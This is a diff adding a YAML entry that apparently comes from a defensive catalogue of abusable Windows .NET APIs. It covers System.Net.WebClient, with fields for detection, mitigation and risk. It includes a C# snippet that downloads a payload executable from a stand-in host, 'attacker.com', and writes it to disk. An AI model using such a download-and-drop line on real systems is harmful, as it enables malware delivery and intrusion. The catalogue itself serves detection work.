@@ -1,0 +1,44 @@
+id: bacad1ef-dc88-4314-a879-ebe7d6ebd608
+name: System.Net.WebClient
+category: windows-dotnet-api
+subcategory: network-communication
+api:
+  namespace: System.Net
+  language: .NET 1.0+
+  documentation: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient
+  class: WebClient
+  method: DownloadString/DownloadData
+abuse_scenarios:
+- name: Payload download
+  technique_id: T1105
+  description: Download and execute remote payloads
+  code_snippet: var wc = new WebClient(); var payload = wc.DownloadData("http://attacker.com/payload.exe");
+    File.WriteAllBytes("C:\\payload.exe", payload);
+  detection_difficulty: easy
+  common_in_campaigns: true
+detection:
+- vendor: Microsoft Defender
+  effectiveness: medium
+  notes: Behavioral detection based on API patterns
+mitigation:
+- category: monitoring
+  description: Monitor usage of System.Net.WebClient
+  feasibility: easy
+risk:
+  severity: high
+  prevalence: widespread
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 70
+references:
+  techniques:
+  - T1105
+  tools:
+  - Cobalt Strike
+  - Mimikatz
+tags:
+- windows-dotnet-api
+- network-communication
+- lotl
+author: magicsword-io
+created: '2026-01-31'
+verified: true
